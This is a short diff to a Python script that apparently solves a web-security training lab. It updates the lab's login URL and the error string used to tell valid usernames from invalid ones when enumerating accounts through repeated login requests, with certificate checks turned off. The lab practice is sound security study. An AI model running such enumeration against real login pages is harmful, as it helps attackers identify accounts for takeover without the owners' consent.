@@ -7,7 +7,7 @@ warnings.simplefilter("ignore")
 
 # request body in dictionary
 payload = {"username": "admin", "password": "admin"}
-url="https://0a1500fa046ab4f880c3440600630046.web-security-academy.net/login"
+url="https://0af00058034a757e81feca80009b00ab.web-security-academy.net/login"
 
 def enum_users():
     # List of usernames to enumerate.
@@ -27,7 +27,7 @@ def enum_users():
         response = requests.post(url, data=payload, verify=False)
 
         # check if the "Invalid username" is in the response, if not then valid username
-        if "Invalid username" not in response.text:
+        if "Invalid username or password." not in response.text:
             # print("\t[+] Found valid username", user, sep=": ")
             validUsers.append(user)
 
